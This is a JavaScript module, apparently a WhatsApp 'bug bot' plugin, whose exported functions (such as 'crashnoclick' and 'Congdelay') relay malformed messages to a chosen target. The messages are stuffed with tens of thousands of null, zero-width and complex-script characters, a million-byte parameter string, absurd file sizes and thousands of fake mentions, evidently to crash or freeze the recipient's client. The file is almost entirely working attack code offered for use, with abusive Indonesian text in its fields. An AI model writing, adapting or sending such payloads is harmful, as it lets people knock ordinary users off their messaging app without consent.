import fs from 'fs';
import path from 'path';
import chalk from 'chalk';

export async function Bangsat(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "kocak",
              subtitle: "\u0000".repeat(18000),
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileLength: "999999999"
              }
            },

            body: {
              text: "Halo Ini Ryszox"
            },

            footer: {
              text: "\u200B".repeat(15000) 
            },

            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Ryszox In Here",
                    url: "{\"display_text\":\"ⓘ ⸸try\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,VnX\"}"
                  })
                }
              ]
            },

            contextInfo: {
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1207655199999@newsletter",
                serverMessageId: 303,
                newsletterName: "Maklo Kontol",
                contentType: 3,
                accessibilityText: "Kacung Gw Lwuh"
              },

              externalAdReply: {
                title: "Kontol" + "ꦾ".repeat(8000),
                body: "\uB002".repeat(9999),
                thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                sourceUrl: "https://t.me/ryszox",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});
  } catch (err) {
    console.error(err);
  }
}
export async function gacor(sock, target) {
  try {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363425712619297@newsletter",
        newsletterName: "ꦾ".repeat(12000) + "𑇂𑆵𑆴𑆿".repeat(20000),
        jpegThumbnail: null,
        caption: "Ayam Lu Bangsat" + "ꦾ".repeat(12000),
        inviteExpiration: 1691244762,
        contextInfo: {
          mentionedJid: [target], 
          externalAdReply: {
            title: "ꦾ".repeat(10000) + "𑇂𑆵𑆴𑆿".repeat(10000),
            body: "yatim",
            sourceUrl:
              "https://mmg.net/" +
              "\u0000".repeat(12003) +
              "A".repeat(12003),
            mediaType: 1,
            renderLargerThumbnail: true,
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target },
    });

  } catch (err) {
    console.log("Error Bos:", err);
  }
}

export async function crashnoclick(sock, target) {
  try {
    const video = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1"
    };

    const message = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: video,
          contextInfo: {
            quotedMessage: {
              stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                fileLength: "9999999999",
                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                mediaKeyTimestamp: "1775044724",
                stickerSentTs: "1775044724091"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, message, {
      messageId: sock.generateMessageTag()
    });

    console.log("Success Sent");
  } catch (err) {
    console.error("Error:", err);
  }
}

export async function Congdelay(sock, target) {
  const Stanza_Id = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝐂𝐨𝐧𝐠 𝐦𝐛𝐠", 
            format: "EXTENTION_1" 
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555020${i + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  })

  await sock.relayMessage("status@broadcast", Stanza_Id.message, {
    messageId: Stanza_Id.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users", 
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })

  const Stanza_Id2 = generateWAMessageFromContent("status@broadcast", {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝐂𝐨𝐧𝐠 𝐦𝐛𝐠", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  })

  await sock.relayMessage("status@broadcast", Stanza_Id2.message, {
    messageId: Stanza_Id2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users", 
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })
}

export async function vfz(sock, target) {
  await sock.relayMessage(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "OnvYb+0Ss+wPFvD8Rl/17+YlXYDRifpw5f+jRE1Gsbg=",
      fileLength: 999999999999999,
      seconds: 999999,
      mediaKey: "RVY9RqvBDcgghvdeedlN5jTK3IsSLsFgqgkzej4e3X4=",
      caption: "𝐂𝐎𝐍𝐆 𝐈𝐒 𝐇𝐄𝐑𝐄",
      height: 850,
      width: 478,
      fileEncSha256: "5zaKfVhEc73jJhA0A76c8pVmUlm2NnuVc3cnWce7RQc=",
      directPath: "/v/t62.7161-24/540088134_2387171995086564_7374737232099736764_n.enc?ccb=11-4&oh=01_Q5Aa3wHsB8VZwvNZZDAwprB9JUvHSPN-aK2xJ5e6pB8CT0rROA&oe=69C791C5&_nc_sid=5e03e0&_nc_hot=1772095746",
      mediaKeyTimestamp: "1772015271",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
      processedVideos: [{
        quality: "HIGH",
        capabilities: ["7eppeliTcore","XzoneCatalyst","PDFsCorp"]
      }],
      gifAttribution: "GIPHY",
      contextInfo: {
        forwardingScore: 7205,
        isForwarded: true,
        pairedMediaType: "HEVC_VIDEO_CHILD",
        forwardOrigin: "UNKNOWN"
      },
      streamingSidecar: "fAMcYnkzkWykVy5Nr51RhzHwBRVBfXHYi5aR/XpP7X8b50/aNLQOKn6Q2Md1FSI0LOk2QW8sfmBSUdpYoPBeOhPFCeWjIKvK6pt7M5eEhKZYk2laDw3jpHKsW0fhQKTsluCFHJQr6oamjFtRs3MybkhXOMEm9osjbq83MBKgR+DqWqGGvic/xVFX5TvHX7saOSY5iCGVeJXlLU/ZZfxQkZO5zx7F3WVY6Y0oXI7bvz/YyT2hPYXRyKhp6SAgm9El6BvkLeYflYV3tlyzly+uMwJJq2nDUWBJYEc0ARR3F4WqpZnpjQJKTtwXl8sC4yHBS2hQFT1sLighApXV1mYEUNJFL9vNMu+9hvv6Irmd/+E4oAXnKB8mpy1scoBigBKlJYX7PrK58SUbN+qj/+WgwaZGVNeMpED2fR9wR8t5TuvXPJgnnEpwfCas",
      annotations: [
        {
          polygonVertices: [
            {
              x: 0.25,
              y: 0.4155234396457672
            },
            {
              x: 0.75,
              y: 0.4155234396457672
            },
            {
              x: 0.75,
              y: 0.5836874842643738
            },
            {
              x: 0.25,
              y: 0.5836874842643738
            }
          ],
          shouldSkipConfirmation: true,
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "806119065866333",
              songId: "1137812656623908",
              author: "‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌".repeat(2000),
              title: "‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌".repeat(2000),
              artworkDirectPath: "/v/t61.89441-24/595437186_731840673341902_1266462731933211674_n.enc?ccb=11-4&oh=01_Q5Aa3wGVOUtWMjbELz41CC6Hq7KB65m4UQ1Ok_J4Onvo7RgRZQ&oe=69C77E6D&_nc_sid=5e03e0",
              artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artworkEncSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
              artistAttribution: "https://t.me/ZeppeliPdf",
              countryBlocklist: "UlU=",
              isExplicit: true,
              artworkMediaKey: "",
              musicSongStartTimeInMs: "7000",
              derivedContentStartTimeInMs: "0",
              overlapDurationInMs: "30000"
            }
          },
          embeddedAction: true
        }
      ],
      metadataUrl: "https://mmg.whatsapp.net/channel/video?id=921729444087793"
    }
  }, {
    participant: { jid:target }
  })
}

let file = import.meta.filename
fs.watchFile(file, async () => {
	fs.unwatchFile(file)
	console.log(chalk.black.bgYellow(` FILES `) + (` File Update ${file} `))
	await import(`${file}?update=${Date.now()}`)
})